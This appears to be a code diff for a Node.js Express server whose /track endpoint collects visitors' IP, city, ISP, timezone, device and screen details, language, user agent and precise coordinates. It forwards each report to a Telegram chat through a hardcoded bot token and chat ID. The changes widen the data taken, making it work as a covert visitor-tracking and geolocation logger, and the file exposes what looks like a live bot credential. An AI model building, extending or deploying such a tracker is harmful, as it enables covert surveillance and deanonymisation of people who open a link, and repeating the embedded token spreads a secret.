@@ -5,7 +5,6 @@ const path = require('path');
 const app = express();
 
 const PORT = process.env.PORT || 8080;
-
 const TELEGRAM_TOKEN = '8045162630:AAEritxdtynKLUG2mr-C0TMIyc0UcDnlKNY';
 const CHAT_ID = '1031226674';
 
@@ -14,17 +13,19 @@ app.use(express.static(path.join(__dirname, 'public')));
 
 app.post('/track', async (req, res) => {
   try {
-    const data = req.body;
+    const d = req.body;
 
     const message = `
 🥔 <b>Новый переход</b>
-🌍 <b>IP:</b> ${data.ip}
-📍 <b>Место:</b> ${data.city}, ${data.country}
-🛰 <b>Провайдер:</b> ${data.org}
-🕓 <b>Часовой пояс:</b> ${data.timezone}
-📱 <b>User-Agent:</b>
-${data.userAgent}
-    `;
+🌍 <b>IP:</b> ${d.ip}
+📍 <b>Город:</b> ${d.city}, ${d.country} (${d.region})
+🛰 <b>Провайдер:</b> ${d.org}
+🕓 <b>Часовой пояс:</b> ${d.timezone} (offset: ${d.timezoneOffset})
+📱 <b>Устройство:</b> ${d.device}, сенсор: ${d.touchSupport ? 'Да' : 'Нет'}
+🖥 <b>Экран:</b> ${d.screen}, язык: ${d.language}
+🧠 <b>User-Agent:</b> ${d.userAgent}
+📍 <b>Координаты:</b> ${d.loc}
+`;
 
     await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
       chat_id: CHAT_ID,
@@ -34,7 +35,7 @@ ${data.userAgent}
 
     res.status(200).end();
   } catch (err) {
-    console.error('Ошибка при логировании:', err.message);
+    console.error('Ошибка:', err.message);
     res.status(500).end();
   }
 });
